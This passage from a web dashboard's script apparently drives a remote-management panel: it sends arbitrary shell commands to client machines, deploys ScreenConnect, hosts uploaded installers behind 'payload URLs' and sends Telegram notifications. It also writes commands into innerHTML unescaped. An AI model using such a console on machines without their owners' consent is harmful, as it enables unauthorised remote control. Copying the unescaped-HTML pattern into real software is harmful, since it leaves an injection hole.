                        } else {
                            termIndex = -1;
                            this.value = '';
                        }
                    }
                });
            }
        }

        // ============================================================
        // TERMINAL FUNCTION
        // ============================================================

        async function sendTermCommand() {
            const input = document.getElementById('termInput');
            const output = document.getElementById('terminalOutput');
            const command = input.value.trim();

            if (!command || !selectedClient) {
                input.value = '';
                input.focus();
                return;
            }

            termHistory.push(command);
            termIndex = -1;

            const line = document.createElement('div');
            line.className = 'term-line';
            line.innerHTML = `<span class="prompt">$</span> <span class="cmd">${command}</span>`;
            output.appendChild(line);

            input.value = '';
            input.focus();

            const runningLine = document.createElement('div');
            runningLine.className = 'term-line';
            runningLine.innerHTML = `<span class="output" style="color:#3b82f6;">⏳ Executing...</span>`;
            output.appendChild(runningLine);
            output.scrollTop = output.scrollHeight;

            try {
                const res = await fetch(`/api/rmm/command/${selectedClient.clientId}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ command: command })
                });
                const data = await res.json();

                output.removeChild(runningLine);

                if (data.status === 'ok') {
                    const sentLine = document.createElement('div');
                    sentLine.className = 'term-line';
                    sentLine.innerHTML = `<span class="output success">✅ Command sent. Waiting for response...</span>`;
                    output.appendChild(sentLine);
                    output.scrollTop = output.scrollHeight;

                    let attempts = 0;
                    const maxAttempts = 15;
                    const checkInterval = setInterval(async () => {
                        attempts++;
                        try {
                            const respRes = await fetch(`/api/rmm/client/${selectedClient.clientId}`);
                            const clientData = await respRes.json();
                            const lastCmd = clientData.commands && clientData.commands.length > 0 ?
                                clientData.commands[clientData.commands.length - 1] : null;

                            if (lastCmd && lastCmd.id === data.commandId) {
                                clearInterval(checkInterval);
                                const resultLine = document.createElement('div');
                                resultLine.className = 'term-line';
                                if (lastCmd.status === 'completed' || lastCmd.status === 'success') {
                                    resultLine.innerHTML = `<span class="output success">✅ ${lastCmd.result || 'Command completed'}</span>`;
                                } else if (lastCmd.status === 'failed') {
                                    resultLine.innerHTML = `<span class="output error">❌ ${lastCmd.result || 'Command failed'}</span>`;
                                } else {
                                    resultLine.innerHTML = `<span class="output">${lastCmd.result || 'Command completed'}</span>`;
                                }
                                output.appendChild(resultLine);
                                output.scrollTop = output.scrollHeight;
                                addPanelLog(`✅ Command: ${command}`, 'success');
                                return;
                            }
                        } catch (e) {}

                        if (attempts >= maxAttempts) {
                            clearInterval(checkInterval);
                            const timeoutLine = document.createElement('div');
                            timeoutLine.className = 'term-line';
                            timeoutLine.innerHTML = `<span class="output error">⚠️ Response timeout. Check client log.</span>`;
                            output.appendChild(timeoutLine);
                            output.scrollTop = output.scrollHeight;
                            addPanelLog(`⚠️ Command timed out: ${command}`, 'warning');
                        }
                    }, 1000);
                } else {
                    const errorLine = document.createElement('div');
                    errorLine.className = 'term-line';
                    errorLine.innerHTML = `<span class="output error">❌ Failed: ${data.message}</span>`;
                    output.appendChild(errorLine);
                    output.scrollTop = output.scrollHeight;
                    addPanelLog(`❌ Command failed: ${command}`, 'error');
                }
            } catch (e) {
                output.removeChild(runningLine);
                const errorLine = document.createElement('div');
                errorLine.className = 'term-line';
                errorLine.innerHTML = `<span class="output error">❌ Error: ${e.message}</span>`;
                output.appendChild(errorLine);
                output.scrollTop = output.scrollHeight;
                addPanelLog(`❌ Error: ${e.message}`, 'error');
            }
        }

        // ============================================================
        // PANEL ACTIONS
        // ============================================================

        async function panelSendCommand(clientId, command) {
            if (!selectedClient || selectedClient.clientId !== clientId) {
                const client = allClients.find(c => c.clientId === clientId);
                if (client) {
                    selectedClient = client;
                    renderPanel(client);
                }
            }
            addPanelLog(`▶️ Sending "${command}"...`, 'info');

            try {
                const res = await fetch(`/api/rmm/command/${clientId}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ command: command })
                });
                const data = await res.json();
                if (data.status === 'ok') {
                    addPanelLog(`✅ "${command}" sent`, 'success');
                    showToast(`✅ Command sent: ${command}`, 'success');
                    setTimeout(() => fetchRmmClients(), 2000);
                } else {
                    addPanelLog(`❌ Failed: ${data.message}`, 'error');
                    showToast(`❌ Failed: ${data.message}`, 'error');
                }
            } catch (e) {
                addPanelLog(`❌ Error: ${e.message}`, 'error');
                showToast('❌ Error sending command', 'error');
            }
        }

        async function panelDeployScreenConnect(clientId) {
            if (!selectedClient || selectedClient.clientId !== clientId) {
                const client = allClients.find(c => c.clientId === clientId);
                if (client) {
                    selectedClient = client;
                    renderPanel(client);
                }
            }

            addPanelLog('📤 Deploying ScreenConnect...', 'info');

            const screenContainer = document.getElementById('panelScreenContainer');
            if (screenContainer) {
                screenContainer.innerHTML = `
                    <div style="text-align:center;">
                        <div class="loading-spinner"></div>
                        <div style="color:#00ff88;margin-top:6px;">Deploying ScreenConnect...</div>
                        <div style="color:#475569;font-size:11px;margin-top:2px;">Please wait</div>
                    </div>
                `;
            }

            try {
                const res = await fetch(`/api/rmm/move/${clientId}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ targetRmm: 'screenconnect' })
                });
                const data = await res.json();

                if (data.status === 'ok') {
                    addPanelLog('✅ ScreenConnect deployed', 'success');
                    showToast('✅ ScreenConnect deployed', 'success');
                    setTimeout(() => {
                        fetchRmmClients();
                        const updatedClient = allClients.find(c => c.clientId === clientId);
                        if (updatedClient) {
                            selectedClient = updatedClient;
                            renderPanel(updatedClient);
                        }
                    }, 3000);
                } else {
                    addPanelLog(`❌ Failed: ${data.message}`, 'error');
                    showToast(`❌ Failed: ${data.message}`, 'error');
                    renderPanel(selectedClient);
                }
            } catch (e) {
                addPanelLog(`❌ Error: ${e.message}`, 'error');
                showToast('❌ Error deploying', 'error');
                renderPanel(selectedClient);
            }
        }

        async function panelViewScreen(clientId) {
            const client = allClients.find(c => c.clientId === clientId);
            if (!client || !client.screenconnectId) {
                showToast('❌ No ScreenConnect ID found', 'error');
                addPanelLog('❌ No ScreenConnect ID found', 'error');
                return;
            }

            try {
                const res = await fetch('/api/config/screenconnect/viewer');
                const data = await res.json();

                let viewerUrl = data.viewerUrl;

                if (!viewerUrl || viewerUrl === '') {
                    showToast('⚠️ Please set ScreenConnect Viewer URL in Settings', 'warning');
                    addPanelLog('⚠️ Viewer URL not configured', 'warning');
                    openSettings();
                    return;
                }

                const fullUrl = viewerUrl.replace(/\/+$/, '') + '/' + client.screenconnectId;
                window.open(fullUrl, '_blank');
                addPanelLog(`🖥️ Viewer opened for ${client.pcName}`, 'info');
                showToast('🖥️ Viewer opened', 'success');
            } catch (e) {
                addPanelLog(`❌ Error: ${e.message}`, 'error');
                showToast('❌ Error opening viewer', 'error');
            }
        }

        // ---- UNINSTALL WITH MODERN CONFIRM ----
        function panelUninstall(clientId) {
            const client = allClients.find(c => c.clientId === clientId);
            if (!client) {
                showToast('❌ Client not found', 'error');
                return;
            }
            
            // Set current client for the callback
            const targetClientId = clientId;
            
            showModal(
                '🗑️ Uninstall Agent',
                `This will uninstall the RMM agent from <strong>${client.pcName}</strong>. The client will no longer report to the server.`,
                '🗑️',
                'Uninstall',
                () => { executeUninstall(targetClientId); },
                true
            );
        }

        async function executeUninstall(clientId) {
            addPanelLog('🗑️ Uninstalling RMM agent...', 'warning');

            const output = document.getElementById('terminalOutput');
            if (output) {
                const line = document.createElement('div');
                line.className = 'term-line';
                line.innerHTML = `<span class="prompt">$</span> <span class="cmd">uninstall-rmm</span>`;
                output.appendChild(line);
                const statusLine = document.createElement('div');
                statusLine.className = 'term-line';
                statusLine.innerHTML = `<span class="output" style="color:#fbbf24;">⏳ Uninstalling...</span>`;
                output.appendChild(statusLine);
                output.scrollTop = output.scrollHeight;
            }

            try {
                const res = await fetch(`/api/rmm/uninstall/${clientId}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' }
                });
                const data = await res.json();
                
                if (data.status === 'ok') {
                    addPanelLog('✅ RMM uninstalled successfully', 'success');
                    showToast('✅ Uninstall sent successfully', 'success');
                    
                    if (output) {
                        const statusLine = output.querySelector('.term-line:last-child');
                        if (statusLine) {
                            statusLine.innerHTML = `<span class="output success">✅ Uninstall command sent — client will be removed</span>`;
                        }
                    }
                    
                    // Remove client from dashboard after uninstall
                    setTimeout(() => {
                        fetchRmmClients();
                        closePanel();
                    }, 2000);
                } else {
                    addPanelLog(`❌ Failed: ${data.message}`, 'error');
                    showToast(`❌ Failed: ${data.message}`, 'error');
                    if (output) {
                        const statusLine = output.querySelector('.term-line:last-child');
                        if (statusLine) {
                            statusLine.innerHTML = `<span class="output error">❌ Uninstall failed: ${data.message}</span>`;
                        }
                    }
                }
            } catch (e) {
                addPanelLog(`❌ Error: ${e.message}`, 'error');
                showToast('❌ Error uninstalling', 'error');
                if (output) {
                    const statusLine = output.querySelector('.term-line:last-child');
                    if (statusLine) {
                        statusLine.innerHTML = `<span class="output error">❌ Error: ${e.message}</span>`;
                    }
                }
            }
        }

        // ---- DELETE WITH MODERN CONFIRM ----
        function panelDelete(clientId) {
            const client = allClients.find(c => c.clientId === clientId);
            if (!client) {
                showToast('❌ Client not found', 'error');
                return;
            }
            
            const targetClientId = clientId;
            
            showModal(
                '✕ Delete Client',
                `Delete <strong>${client.pcName}</strong> from the dashboard? This will <strong>not</strong> uninstall the agent from the machine.`,
                '✕',
                'Delete',
                () => { executeDelete(targetClientId); },
                true
            );
        }

        async function executeDelete(clientId) {
            try {
                const res = await fetch(`/api/rmm/delete/${clientId}`, {
                    method: 'DELETE'
                });
                const data = await res.json();
                if (data.status === 'ok') {
                    addPanelLog('🗑️ Client deleted from dashboard', 'info');
                    showToast('✅ Client deleted', 'success');
                    fetchRmmClients();
                    closePanel();
                } else {
                    showToast(`❌ Failed: ${data.message}`, 'error');
                }
            } catch (e) {
                showToast('❌ Error deleting client', 'error');
            }
        }

        // ============================================================
        // FILE UPLOAD FUNCTIONS
        // ============================================================

        async function loadFileInfo() {
            try {
                const res = await fetch('/api/config/screenconnect/file');
                const data = await res.json();
                document.getElementById('currentFileName').textContent = data.hasFile ? data.filename : 'None uploaded';
                document.getElementById('currentFileName').style.color = data.hasFile ? '#00ff88' : '#64748b';
            } catch (e) {}
        }

        async function uploadFile() {
            const input = document.getElementById('fileInput');
            const file = input.files[0];

            if (!file) {
                showToast('❌ Please select a file first', 'error');
                return;
            }

            const allowedTypes = ['.msi', '.exe', '.zip'];
            const ext = '.' + file.name.split('.').pop().toLowerCase();
            if (!allowedTypes.includes(ext)) {
                showToast('❌ Only .msi, .exe, and .zip files allowed', 'error');
                return;
            }

            if (file.size > 50 * 1024 * 1024) {
                showToast('❌ File too large. Max 50MB.', 'error');
                return;
            }

            showToast('⏳ Uploading...', 'warning');

            const formData = new FormData();
            formData.append('file', file);

            try {
                const res = await fetch('/api/upload/screenconnect', {
                    method: 'POST',
                    body: formData
                });
                const data = await res.json();

                if (data.status === 'ok') {
                    showToast('✅ File uploaded successfully!', 'success');
                    loadFileInfo();
                    updatePayloadUrls();
                } else {
                    showToast('❌ ' + data.message, 'error');
                }
            } catch (e) {
                showToast('❌ Upload failed: ' + e.message, 'error');
            }
        }

        async function deleteFile() {
            showModal(
                '🗑️ Delete File',
                'Delete the uploaded ScreenConnect installer file?',
                '🗑️',
                'Delete',
                () => { executeDeleteFile(); },
                true
            );
        }

        async function executeDeleteFile() {
            try {
                const res = await fetch('/api/upload/screenconnect', {
                    method: 'DELETE'
                });
                const data = await res.json();

                if (data.status === 'ok') {
                    showToast('✅ File deleted', 'success');
                    loadFileInfo();
                    updatePayloadUrls();
                } else {
                    showToast('❌ ' + data.message, 'error');
                }
            } catch (e) {
                showToast('❌ Delete failed: ' + e.message, 'error');
            }
        }

        async function updateScViewerUrl() {
            const url = document.getElementById('scViewerUrl').value.trim();
            if (!url) {
                showToast('❌ Please enter a viewer URL', 'error');
                return;
            }
            try {
                const res = await fetch('/api/config/screenconnect/viewer', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ viewerUrl: url })
                });
                const data = await res.json();
                if (data.status === 'ok') {
                    showToast('✅ Viewer URL updated!', 'success');
                } else {
                    showToast('❌ ' + data.message, 'error');
                }
            } catch (e) {
                showToast('❌ Failed to update', 'error');
            }
        }

        // ============================================================
        // SETTINGS
        // ============================================================

        function openSettings() {
            document.getElementById('settingsOverlay').classList.add('active');
            loadSettings();
        }

        function closeSettings() {
            document.getElementById('settingsOverlay').classList.remove('active');
        }

        async function loadSettings() {
            try {
                const res = await fetch('/api/config/telegram');
                const data = await res.json();
                document.getElementById('telegramToken').value = data.botToken || '';
                document.getElementById('telegramChatId').value = data.chatId || '';
                document.getElementById('telegramNotifications').checked = data.notifications !== false;

                await loadFileInfo();

                const viewerRes = await fetch('/api/config/screenconnect/viewer');
                const viewerData = await viewerRes.json();
                document.getElementById('scViewerUrl').value = viewerData.viewerUrl || '';
            } catch (e) {}
        }

        async function changePassword() {
            const oldPass = document.getElementById('oldPassword').value;
            const newPass = document.getElementById('newPassword').value;
            const confirmPass = document.getElementById('confirmPassword').value;

            document.querySelectorAll('.error-text').forEach(el => el.classList.remove('show'));

            if (!oldPass) {
                document.getElementById('oldPasswordError').textContent = 'Enter current password';
                document.getElementById('oldPasswordError').classList.add('show');
                return;
            }
            if (newPass.length < 4) {
                document.getElementById('newPasswordError').classList.add('show');
                return;
            }
            if (newPass !== confirmPass) {
                document.getElementById('confirmPasswordError').classList.add('show');
                return;
            }

            try {
                const res = await fetch('/api/change-password', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ oldPassword: oldPass, newPassword: newPass })
                });
                const data = await res.json();
                if (data.status === 'ok') {
                    showToast('✅ Password changed!', 'success');
                    closeSettings();
                    setTimeout(() => { window.location.href = '/password-success'; }, 1000);
                } else if (data.message === 'Current password is incorrect') {
                    document.getElementById('oldPasswordError').textContent = 'Current password is incorrect';
                    document.getElementById('oldPasswordError').classList.add('show');
                } else {
                    showToast('❌ ' + (data.message || 'Failed'), 'error');
                }
            } catch (e) {
                showToast('❌ Error changing password', 'error');
            }
        }

        async function updateTelegramSettings() {
            const botToken = document.getElementById('telegramToken').value.trim();
            const chatId = document.getElementById('telegramChatId').value.trim();
            const notifications = document.getElementById('telegramNotifications').checked;

            if (!botToken || !chatId) {
                showToast('❌ Bot token and chat ID required', 'error');
                return;
            }

            try {
                const res = await fetch('/api/config/telegram', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ botToken, chatId, notifications })
                });
                const data = await res.json();
                if (data.status === 'ok') {
                    showToast('✅ Telegram settings updated!', 'success');
                } else {
                    showToast('❌ ' + data.message, 'error');
                }
            } catch (e) {
                showToast('❌ Failed to update', 'error');
            }
        }

        // ============================================================
        // LOGOUT
        // ============================================================

        function showLogoutConfirm() {
            document.getElementById('logoutConfirmOverlay').classList.add('active');
        }

        function hideLogoutConfirm() {
            document.getElementById('logoutConfirmOverlay').classList.remove('active');
        }

        function executeLogout() {
            hideLogoutConfirm();
            window.location.href = '/logout';
        }

        // ============================================================
        // KEYBOARD SHORTCUTS
        // ============================================================

        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                closePanel();
                closeSettings();
                hideLogoutConfirm();
                hideCustomConfirm();
            }
        });

        document.addEventListener('click', function(e) {
            const terminal = document.getElementById('terminalContainer');
            if (terminal && terminal.contains(e.target)) {
                const input = document.getElementById('termInput');
                if (input) input.focus();
            }
        });

        // ============================================================
        // INIT
        // ============================================================

        document.addEventListener('DOMContentLoaded', function() {
            checkSession().then((valid) => {
                if (!valid) return;
                fetchRmmClients();
                updatePayloadUrls();
                setInterval(fetchRmmClients, 30000);
            });
        });

        console.clear();
    </script>

</body>
</html>
